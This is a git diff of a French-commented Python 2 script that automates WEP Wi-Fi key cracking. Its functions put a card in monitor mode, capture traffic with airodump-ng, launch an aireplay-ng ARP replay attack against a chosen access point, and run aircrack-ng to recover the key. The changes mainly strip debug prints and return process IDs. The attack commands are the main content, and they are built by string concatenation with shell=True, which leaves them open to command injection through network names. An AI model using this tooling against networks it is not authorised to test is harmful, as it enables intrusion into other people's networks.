@@ -14,7 +14,6 @@ def monitoring():
 	fichier = open("airmon.txt", "w")
 	fichier.write(cmd_only_airmon)
 	fichier.close()
-
 	fichier = open("airmon.txt", "r")
 	file_line = fichier.readline()
 	wlan_wanted = ""
@@ -22,28 +21,20 @@ def monitoring():
 		file_line = fichier.readline()
 		if "rt2800" in file_line:
 			wlan_wanted = file_line[:5].replace(" ", "")
-
-	print wlan_wanted
-	print "derniere ligne"
-
 	cmd_monitoring = subprocess.check_output(["airmon-ng", "start", wlan_wanted])
 
-
 """
-	Ecoute globale, commande airodump (a executer apres le monitoring)
+	Ecoute globale, commande airodump (à executer apres le monitoring)
+	time: temps de l'écoute en seconde(s)
 """
 def global_listening():
-	cmd = "airodump-ng -w qq mon0"
+	cmd = "airodump-ng -w TestBox/global/record mon0"
 	FNULL = open(os.devnull, 'w')
-
 	# The os.setsid() is passed in the argument preexec_fn so
 	# it's run after the fork() and before  exec() to run the shell.
 	pro = subprocess.Popen(cmd, stdout=FNULL, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
 
-	print pro
-	print pro.pid
-	time.sleep(10)
-	print os.killpg(pro.pid, signal.SIGTERM)  # Send the signal to all the process groups
+	return pro.pid
 
 """
 	Ecoute locale sur une seule box via un fichier xml parsé
@@ -58,41 +49,32 @@ def network_listening(registered_network):
 
 	FNULL = open(os.devnull, 'w')
 	pro = subprocess.Popen(cmd, stdout=FNULL, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
-	print pro
-	print pro.pid
-	time.sleep(10)
-	print os.killpg(pro.pid, signal.SIGTERM)  # Send the signal to all the process groups
+
+	return pro.pid
 
 """
 	Lancement de l'attaque arp
 	registered_network: box que l'on attaque
-	datafile_path : chemin du fichier d'écoute (obsolète si l'écoute locale est simultanée)
-	/!\ tout les chemins sont en relatifs !!
+	/!\ tous les chemins sont en relatifs !!
 """
-def arp_attack(registered_network, datafile_path):
+def arp_attack(registered_network):
 	BSSID = registered_network._BSSID
 	ESSID = registered_network._ESSID
 	Channel = registered_network._Channel
 
-	cmd = "aireplay-ng -3 -e " + ESSID + " -h " + BSSID + " -r " + datafile_path + " mon0 --ignore-negative-one";
+	cmd = "aireplay-ng -3 -e " + ESSID + " -h " + BSSID + " mon0 --ignore-negative-one";
 
 	FNULL = open(os.devnull, 'w')
 	pro = subprocess.Popen(cmd, stdout=FNULL, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
-	print pro
-	print pro.pid
-	time.sleep(10)
-	print os.killpg(pro.pid, signal.SIGTERM)  # Send the signal to all the process groups
+	return pro.pid
 
 """
-	Decriptage des iv/cap pour l'obtention de la clé
-	datafile_path : dossiers dans lesquel sont les .cap/.iv
+	Decryptage des iv/cap pour l'obtention de la clé
+	datafile_path : dossiers dans lesquels sont les .cap/.iv
 """
 def aircrack_final_wep(datafile_path):
 	cmd = "aircrack-ng " + datafile_path + "/*<.cap/.iv>";
 
 	FNULL = open(os.devnull, 'w')
 	pro = subprocess.Popen(cmd, stdout=FNULL, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
-	print pro
-	print pro.pid
-	time.sleep(10)
-	print os.killpg(pro.pid, signal.SIGKILL)  # Send the signal to all the process groups
+	return pro.pid
